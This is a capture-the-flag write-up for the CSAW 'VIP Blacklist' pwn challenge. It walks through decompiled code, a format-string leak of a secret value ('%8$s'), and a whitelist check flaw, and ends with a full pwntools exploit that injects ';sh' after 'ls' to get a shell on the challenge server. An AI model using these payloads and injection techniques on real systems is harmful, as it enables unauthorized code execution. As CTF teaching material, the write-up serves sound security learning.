# VIP Blacklist (pwn)  
![image](https://github.com/user-attachments/assets/08fb970a-2cd8-429f-a397-f15d988d26f1)  
Let's see what happens when we run it.  
![image](https://github.com/user-attachments/assets/53fe103a-bba8-46c4-afed-cb255289f28b)  

It appears that there is a list of allowed commands that we can run, let's see what is actually going on using ghidra.  

```c

void handle_client(void)

{
  bool bVar1;
  int iVar2;
  size_t sVar3;
  char *pcVar4;
  long in_FS_OFFSET;
  uint local_ac;
  uint local_a4;
  char *local_a0;
  char *local_98;
  FILE *local_90;
  char local_82 [10];
  char input_buf [32];
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_ac = 0x14;
  randGen(&local_a0);
  puts(
      "\"Welcome to the club. It\'s ok, don\'t be in a rush. You\'ve got all the time in the world. As long as you are a vip that is.\""
      );
  displayCommands();
LAB_00101c2e:
  do {
    pcVar4 = fgets(input_buf,32,stdin);
    if (pcVar4 == (char *)0x0) {
code_r0x00101c50:
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    sVar3 = strcspn(input_buf,"\n");
    input_buf[sVar3] = '\0';
    iVar2 = strcmp(input_buf,"exit");
    if (iVar2 == 0) {
      puts("Bye!");
      goto code_r0x00101c50;
    }
    iVar2 = strcmp(input_buf,local_a0);
    if (iVar2 == 0) {
      iVar2 = strcmp(whitelist,"queue");
      if (iVar2 != 0) {
        puts("\nAh VIP, please come this way...");
        allowCopy();
      }
    }
    sprintf(local_82,input_buf);
    local_58 = 0x6e69747563657845;
    local_50 = 0x203a67;
    local_48 = 0;
    local_40 = 0;
    local_38 = 0;
    local_30 = 0;
    local_28 = 0;
    local_20 = 0;
    strcat((char *)&local_58,local_82);
    sVar3 = strlen((char *)&local_58);
    *(undefined4 *)((long)&local_58 + sVar3) = 0xa2e2e2e;
    *(undefined *)((long)&local_58 + sVar3 + 4) = 0;
    puts((char *)&local_58);
    bVar1 = false;
    for (local_a4 = 0; local_a4 < 4; local_a4 = local_a4 + 1) {
      iVar2 = strcmp(input_buf,whitelist + (long)(int)local_a4 * 6);
      if (iVar2 == 0) {
        bVar1 = true;
        break;
      }
    }
    if (bVar1) {
      iVar2 = strcmp(input_buf,"queue");
      if (iVar2 == 0) {
        printf("You are currently in position: %d\n",(ulong)local_ac);
        goto LAB_00101c2e;
      }
      local_90 = popen(input_buf,"r");
      if (local_90 == (FILE *)0x0) {
        perror("Error executing command");
        goto code_r0x00101c50;
      }
      while( true ) {
        pcVar4 = fgets(input_buf,0x20,local_90);
        if (pcVar4 == (char *)0x0) break;
        printf("%s",input_buf);
      }
      pclose(local_90);
      local_ac = local_ac - 1;
      if (local_ac == 0) {
        puts("Hello! You are at the front of the queue now. Oh hold on one second");
        puts("I\'m getting some new info...");
        kickOut();
      }
    }
    else {
      local_98 = "Command not allowed\n";
      printf("%s","Command not allowed\n");
    }
    displayCommands();
  } while( true );
}
```

Pay special attention to `randGen()`. It seems that it's generating a special "random" value that we can then provide as a command to gain access to another function.  \
```c

void randGen(void **param_1)

{
  int iVar1;
  void *pvVar2;
  time_t tVar3;
  ulong local_18;
  
  pvVar2 = malloc(10);
  tVar3 = time((time_t *)0x0);
  srand((uint)tVar3);
  for (local_18 = 0; local_18 < 10; local_18 = local_18 + 1) {
    iVar1 = rand();
    *(char *)(local_18 + (long)pvVar2) = (char)iVar1;
  }
  *param_1 = pvVar2;
  return;
}
```
Ah, this is a classic `Bad Seed` vulnerability. So this is actually not random, we could initialize another process at the exact same time and have the same seed as the program, allowing us to "predict" their randomness. However due to network delays and the like I didn't want to deal with this.  
There is actually another way...  
I don't know if this was intended but
```c
sprintf(local_82,input_buf);
```
They are using user input without sanitizing...
This is a format string vulnerability! This should actually be enough to pwn the program, since it gives us both a read and a write primitive, but we will actually only use it for leaking the random value as it is easier to exploit without using the format string write.  
```python
io.recvuntil(b"ls")
io.sendline(b"%8$s")
io.recvuntil(b": ")
leak = io.recv(10)
print(leak)
io.recvuntil(b"ls")
io.sendline(leak)
```
Using gdb we can find out what input we need to give to leak the secret value.  
Now that we know the secret value we get access to another function.  
```c
void allowCopy(void)

{
  int iVar1;
  ssize_t sVar2;
  size_t sVar3;
  long in_FS_OFFSET;
  int local_90;
  int local_8c;
  int local_88;
  ulong local_80;
  char local_68 [10];
  undefined2 uStack_5e;
  undefined4 uStack_5c;
  char input_buf [40];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  puts(
      "You may add a new command, \"queue\", to your possible commands which will give you your posi tion. \nIf you would not like this, just press enter."
      );
  displayCommands();
  sVar2 = read(0,input_buf,0x20);
  if (sVar2 < 0) {
    perror("Error reading from stdin");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  sVar3 = strcspn(input_buf,"\n");
  input_buf[sVar3] = '\0';
  local_90 = 0;
  while( true ) {
    sVar3 = strlen("queue");
    if (sVar3 + 1 <= (ulong)(long)local_90) break;
    if (input_buf[local_90] != "queue"[local_90]) {
      kickOut();
    }
    local_90 = local_90 + 1;
  }
  puts(
      "\"We are currently getting you a valet to inform you of your queue position\nPlease wait one second...\""
      );
  local_68[6] = 'e';
  local_68[7] = 'x';
  local_68[8] = 'i';
  local_68[9] = 't';
  local_68[0] = 'c';
  local_68[1] = 'l';
  local_68[2] = 'e';
  local_68[3] = 'a';
  local_68[4] = 'r';
  local_68[5] = '\0';
  uStack_5e = 0;
  uStack_5c = 0x736c;
  for (local_8c = 3; -1 < local_8c; local_8c = local_8c + -1) {
    strcpy(whitelist + (long)local_8c * 6,whitelist + (long)(local_8c + -1) * 6);
  }
  for (local_88 = 0; (long)local_88 < sVar2 + -1; local_88 = local_88 + 1) {
    whitelist[local_88] = input_buf[local_88];
  }
  iVar1 = safety(local_68);
  if (iVar1 == 0) {
    kickOut();
  }
  else {
    sleep(1);
    puts("\"The valet has arrived, feel free to check your queue position now.\"");
  }
  for (local_80 = 0; local_80 < 4; local_80 = local_80 + 1) {
    puts(whitelist + local_80 * 6);
  }
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
Notice that we are now allowed to write to the `whitelist`, so we could potentially have more commands that we are allowed to call.  
We can write `0x20` bytes, way more than we need, but there are a bunch of constraints that we have to satisfy.  
1. the first 5 letters must be "queue"
2. A copy of the original whitelist is passed to the `safety()` function to check that the new whitelist hasn't modified the previous values.

 ```c
undefined8 safety(long param_1)

{
  int iVar1;
  ulong uVar2;
  size_t sVar3;
  ulong local_20;
  ulong local_18;
  
  iVar1 = strcmp(whitelist,"queue");
  uVar2 = (ulong)(iVar1 == 0);
  for (local_20 = uVar2; local_20 < 4; local_20 = local_20 + 1) {
    sVar3 = strlen(whitelist + local_20 * 6);
    if (5 < sVar3) {
      kickOut();
    }
    local_18 = 0;
    while( true ) {
      sVar3 = strlen((char *)(param_1 + (local_20 - uVar2) * 6));
      if (sVar3 <= local_18) break;
      if (*(char *)(local_18 + (local_20 - uVar2) * 6 + param_1) !=
          whitelist[local_18 + local_20 * 6]) {
        kickOut();
      }
      local_18 = local_18 + 1;
    }
  }
  return 1;
}
```
However, there is a problem. Notice that each command can be up to 5 characters long. BUT, they only check the integrity of the characters that are the same length of the original whitelist.
I.E. for the command `ls\x00\x00\x00`, they only check the first two characters.
We can inject three characters into the command.  
I immediately thought `ls;<something else goes here`  
I google `two letter linux commands`  
![image](https://github.com/user-attachments/assets/4c6d08b8-6537-4667-8470-3627b795f3ac)  
AHA!  

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template vip_blacklist
from pwn import *
import os
# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'vip_blacklist')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

#io = start()
io = remote('vip-blacklist.ctf.csaw.io', 9999)
#gdb.attach(io)

io.recvuntil(b"ls")
io.sendline(b"%8$s")
io.recvuntil(b": ")
leak = io.recv(10)
print(leak)
io.recvuntil(b"ls")
io.sendline(leak)
#io.interactive()

io.recvuntil(b"ls")
command = 'ls /'.encode()
payload = b'queue\x00clear' + b'\x00' 
payload += b'exit' + b'\x00' * 2
# Have 3 bytes of free space to append to end of "ls" command
# each command must have length less than 6
payload += b'ls' + b';sh'

io.sendline(payload)

io.interactive()
```
![image](https://github.com/user-attachments/assets/c9b91359-2b7f-4291-ba69-52f5a5afb866)



